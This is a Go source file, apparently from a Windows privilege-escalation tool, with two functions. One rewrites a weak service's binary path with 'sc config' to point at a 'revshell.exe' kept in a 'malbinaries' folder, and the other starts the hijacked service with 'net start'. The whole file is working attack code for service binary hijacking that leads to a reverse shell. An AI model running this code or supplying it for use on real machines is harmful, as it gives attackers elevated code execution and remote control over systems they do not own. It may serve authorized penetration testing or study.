package enumwin

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/fatih/color"
)

func ChangeBinPath(serv *WeakServ, choice int) *WeakServ {
	// Modifies service binary -> return pointer to
	// modified service

	// Hold user home directory and append revshell path to it
	homeDir, _ := os.UserHomeDir()

	// Fix home dir format here. Change delimeter to / and send make
	// it lowercase. Idk why this works.
	homeDir = strings.ToLower(strings.Replace(homeDir, `\`, `/`, -1))

	malPath := fmt.Sprintf(homeDir + `/win-binary-hijacking/internal/malbinaries/revshell.exe`)

	// Formatting sc config portion here
	cmdFormat := fmt.Sprintf(`binpath="%s"`, malPath)

	fmt.Println(cmdFormat)

	cmd := exec.Command("sc", "config", serv.Name, cmdFormat)

	err := cmd.Run()

	if err != nil {
		color.Red("Error changing binary path for service: %s: %v\n", serv.Name, err)
	} else {
		color.Red("Changed binary path for service: %s succesfully", serv.Name)
	}

	return serv
}

func StartServ(serv *WeakServ) {
	// Function to start exploited service

	cmd := exec.Command("net", "start", serv.Name)

	err := cmd.Run()

	if err != nil {
		color.Red("Could not start service: %s", serv.Name)
	} else {
		color.Red("Service started")
	}
}
